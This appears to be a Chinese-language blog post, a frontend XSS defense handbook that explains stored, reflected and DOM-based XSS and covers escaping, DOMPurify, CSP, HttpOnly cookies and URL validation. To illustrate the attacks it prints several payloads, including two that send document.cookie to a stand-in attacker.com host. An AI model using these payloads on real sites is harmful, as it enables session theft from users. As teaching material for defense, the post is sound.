---
title: "前端安全：XSS 防禦手冊"
date: 2018-03-08 10:50:19
tags:
  - 安全
readingTime: 2
description: "XSS（Cross-Site Scripting）是最常見的前端安全漏洞之一。這篇文章從攻擊原理到防禦方案，系統整理一遍。"
wordCount: 461
---

XSS（Cross-Site Scripting）是最常見的前端安全漏洞之一。這篇文章從攻擊原理到防禦方案，系統整理一遍。

## XSS 的三種類型

### 存儲型 XSS

攻擊者把惡意腳本存到數據庫，其他用户訪問時執行：

```
攻擊者提交評論：<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

服務端保存到數據庫
↓
其他用户加載評論列表
↓
瀏覽器執行 script，把 cookie 發送到攻擊者服務器
```

危害最大，因為每個訪問該頁面的用户都受影響。

### 反射型 XSS

惡意腳本藏在 URL 裏，誘導用户點擊：

```
正常 URL：https://example.com/search?q=前端
惡意 URL：https://example.com/search?q=<script>alert(document.cookie)</script>

服務端把 q 參數直接拼進 HTML：
<p>搜索結果：<script>alert(document.cookie)</script></p>
```

### DOM 型 XSS

攻擊發生在客户端，不經過服務器：

```javascript
// 危險代碼：直接把 URL 參數插入 DOM
const query = location.search.substring(1);
document.getElementById("result").innerHTML = "搜索：" + query;

// 攻擊 URL：?<img src=x onerror=alert(document.cookie)>
```

## 防禦方案

### 1. 輸出編碼（最基礎）

永遠不要把用户輸入直接插入 HTML。使用轉義函數：

```javascript
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// 使用
element.textContent = userInput; // ✅ 安全，瀏覽器自動轉義
element.innerHTML = escapeHTML(userInput); // ✅ 手動轉義

element.innerHTML = userInput; // ❌ 危險！
```

Vue 默認使用 `&#123;&#123; &#125;&#125;` 渲染文本內容，自動轉義，是安全的：

```vue
{% raw %}
<template>
  <!-- ✅ 安全：自動轉義 -->
  <p>{{ userComment }}</p>

  <!-- ❌ 危險：v-html 不轉義 -->
  <p v-html="userComment"></p>
</template>
{% endraw %}
```

### 2. v-html 的安全使用

如果確實需要渲染 HTML（比如富文本），必須先消毒（sanitize）：

```javascript
import DOMPurify from "dompurify";

// 配置允許的標籤和屬性
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});
```

```vue
<p v-html="sanitizedContent"></p>
```

### 3. CSP（內容安全策略）

HTTP 響應頭裏告訴瀏覽器隻允許加載指定來源的資源：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-xxx';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com
```

即使 XSS 代碼被注入，由於 CSP 限製，惡意腳本也無法加載和執行。

Nginx 配置：

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'";
```

### 4. HttpOnly Cookie

把 session token 設置為 HttpOnly，JS 無法讀取：

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

即使發生 XSS，攻擊者也無法通過 `document.cookie` 竊取 token。

### 5. 輸入驗證

前端驗證隻是輔助，真正的驗證必須在服務端做。但前端也應該：

```javascript
// 富文本編輯器：限製允許的 HTML 標籤
// URL 參數：驗證格式，拒絕 javascript: 協議
function isSafeURL(url) {
  try {
    const parsed = new URL(url);
    return ["http:", "https:"].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// ❌ javascript:alert(1)  → 被拒絕
// ✅ https://example.com   → 允許
```

## 實際踩坑案例

**案例：搜索框反射 XSS**

```vue
<!-- ❌ 把 URL 參數直接顯示，沒有轉義 -->
<template>
  <p v-html="'搜索：' + $route.query.keyword"></p>
</template>
```

攻擊 URL：`?keyword=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`

修復：

```vue
{% raw %}
<!-- ✅ 用文本插值，自動轉義 -->
<template>
  <p>搜索：{{ $route.query.keyword }}</p>
</template>
{% endraw %}
```

## 防禦清單

- [ ] 不使用 `innerHTML`，優先用 `textContent`
- [ ] Vue 中謹慎使用 `v-html`，必須先 sanitize
- [ ] 服務端對所有輸出做 HTML 轉義
- [ ] 配置 CSP 響應頭
- [ ] Session cookie 設置 HttpOnly + Secure
- [ ] URL 參數使用前驗證協議類型

## 小結

XSS 防禦的核心原則：**永遠不信任用户輸入**，輸出時永遠轉義。CSP 和 HttpOnly 是額外的防禦層，出問題時限製損害。
